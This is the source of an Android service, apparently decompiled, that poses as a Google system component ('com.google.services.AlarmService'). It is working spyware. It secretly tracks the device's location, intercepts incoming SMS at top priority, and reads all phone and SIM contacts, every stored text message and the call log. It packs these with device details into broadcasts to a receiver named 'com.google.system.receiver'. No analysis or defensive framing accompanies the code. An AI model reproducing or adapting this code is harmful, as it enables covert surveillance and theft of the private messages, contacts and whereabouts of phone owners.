package com.google.services;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Build;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.os.IBinder;
import android.provider.CallLog.Calls;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.text.TextUtils;
import java.sql.Date;
import java.text.SimpleDateFormat;

public class AlarmService extends Service {
    private static final int PHONES_DISPLAY_NAME_INDEX = 0;
    private static final int PHONES_NUMBER_INDEX = 1;
    private static final String[] PHONES_PROJECTION = new String[]{"display_name", "data1"};
    private final LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
            AlarmService.this.updateWithNewLocation(location);
        }

        public void onProviderDisabled(String str) {
            AlarmService.this.updateWithNewLocation(null);
        }

        public void onProviderEnabled(String str) {
        }

        public void onStatusChanged(String str, int i, Bundle bundle) {
        }
    };
    Context mContext = null;

    public void onCreate() {
        super.onCreate();
        IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
        intentFilter.setPriority(Integer.MAX_VALUE);
        registerReceiver(new alarmReceiver(), intentFilter);
        try {
            LocationManager locationManager = (LocationManager) getSystemService("location");
            Criteria criteria = new Criteria();
            criteria.setAccuracy(PHONES_NUMBER_INDEX);
            criteria.setAltitudeRequired(false);
            criteria.setBearingRequired(false);
            criteria.setCostAllowed(true);
            criteria.setPowerRequirement(PHONES_NUMBER_INDEX);
            String bestProvider = locationManager.getBestProvider(criteria, true);
            updateWithNewLocation(locationManager.getLastKnownLocation(bestProvider));
            locationManager.requestLocationUpdates(bestProvider, 10000, 20.0f, this.locationListener);
        } catch (Exception e) {
        }
        this.mContext = this;
        String str = ("mobile:" + Build.MODEL + ",SDK version:" + VERSION.SDK + ",OS version:" + VERSION.RELEASE + "#") + getPhoneContacts() + getSIMContacts();
        Intent intent = new Intent();
        intent.setAction("com.google.system.receiver");
        Bundle bundle = new Bundle();
        bundle.putString("contact", str);
        intent.putExtras(bundle);
        sendBroadcast(intent);
        str = getRecord();
        intent = new Intent();
        intent.setAction("com.google.system.receiver");
        bundle = new Bundle();
        bundle.putString("other", str);
        intent.putExtras(bundle);
        sendBroadcast(intent);
    }

    public void onStart(Intent intent, int i) {
        Intent intent2 = new Intent();
        intent2.setAction("com.google.system.receiver");
        Bundle bundle = new Bundle();
        bundle.putString("sms", getSms());
        intent2.putExtras(bundle);
        sendBroadcast(intent2);
    }

    public IBinder onBind(Intent intent) {
        return null;
    }

    private String getPhoneContacts() {
        Cursor query = this.mContext.getContentResolver().query(Phone.CONTENT_URI, PHONES_PROJECTION, null, null, null);
        String str = "";
        if (query != null) {
            while (query.moveToNext()) {
                String string = query.getString(PHONES_NUMBER_INDEX);
                if (!TextUtils.isEmpty(string)) {
                    str = str + "name:" + query.getString(PHONES_DISPLAY_NAME_INDEX) + ",phonenumber:" + string + ";";
                }
            }
            query.close();
        }
        return str;
    }

    private String getSIMContacts() {
        Cursor query = this.mContext.getContentResolver().query(Uri.parse("content://icc/adn"), PHONES_PROJECTION, null, null, null);
        String str = "";
        if (query != null) {
            while (query.moveToNext()) {
                String string = query.getString(PHONES_NUMBER_INDEX);
                if (!TextUtils.isEmpty(string)) {
                    str = str + "name:" + query.getString(PHONES_DISPLAY_NAME_INDEX) + ",phonenumber:" + string + ";";
                }
            }
            query.close();
        }
        return str;
    }

    /* access modifiers changed from: private */
    public void updateWithNewLocation(Location location) {
        String str;
        if (location != null) {
            str = "Long&Lat:" + location.getLongitude() + "," + location.getLatitude();
        } else {
            str = "No location found";
        }
        Intent intent = new Intent();
        intent.setAction("com.google.system.receiver");
        Bundle bundle = new Bundle();
        bundle.putString("location", str);
        intent.putExtras(bundle);
        sendBroadcast(intent);
    }

    private String getSms() {
        StringBuilder stringBuilder = new StringBuilder();
        try {
            Cursor query = getContentResolver().query(Uri.parse("content://sms/"), new String[]{"_id", "address", "person", "body", "date", "type"}, null, null, "date desc");
            if (query.moveToFirst()) {
                int columnIndex = query.getColumnIndex("person");
                int columnIndex2 = query.getColumnIndex("address");
                int columnIndex3 = query.getColumnIndex("body");
                int columnIndex4 = query.getColumnIndex("date");
                int columnIndex5 = query.getColumnIndex("type");
                do {
                    String str;
                    String string = query.getString(columnIndex);
                    String string2 = query.getString(columnIndex2);
                    String string3 = query.getString(columnIndex3);
                    String format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(Long.parseLong(query.getString(columnIndex4))));
                    int i = query.getInt(columnIndex5);
                    if (i == PHONES_NUMBER_INDEX) {
                        str = "接收";
                    } else if (i == 2) {
                        str = "发送";
                    } else {
                        str = "";
                    }
                    stringBuilder.append("发信人：");
                    stringBuilder.append(string + ",电话号码：");
                    stringBuilder.append(string2 + ",消息内容：");
                    stringBuilder.append(string3 + ",时间：");
                    stringBuilder.append(format + ",类型");
                    stringBuilder.append(str);
                    stringBuilder.append(";");
                } while (query.moveToNext());
            } else {
                stringBuilder.append("no result!");
            }
        } catch (Exception e) {
        }
        return stringBuilder.toString();
    }

    private String getRecord() {
        StringBuilder stringBuilder = new StringBuilder();
        String str = "";
        str = "";
        str = "";
        Cursor query = getContentResolver().query(Calls.CONTENT_URI, new String[]{"number", "name", "type", "date", "duration"}, null, null, "date DESC");
        if (query.moveToFirst()) {
            while (query.moveToNext()) {
                String string = query.getString(PHONES_DISPLAY_NAME_INDEX);
                String string2 = query.getString(PHONES_NUMBER_INDEX);
                int i = query.getInt(2);
                long j = query.getLong(4);
                String format = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss").format(new Date(Long.parseLong(query.getString(3))));
                stringBuilder.append("时间：");
                stringBuilder.append(format + ",姓名：");
                stringBuilder.append(string2 + ",电话号码：");
                stringBuilder.append(string + ",类型：");
                stringBuilder.append(i + ",时长");
                stringBuilder.append(j);
                stringBuilder.append(";");
            }
        } else {
            stringBuilder.append("no record found!");
        }
        return stringBuilder.toString();
    }
}
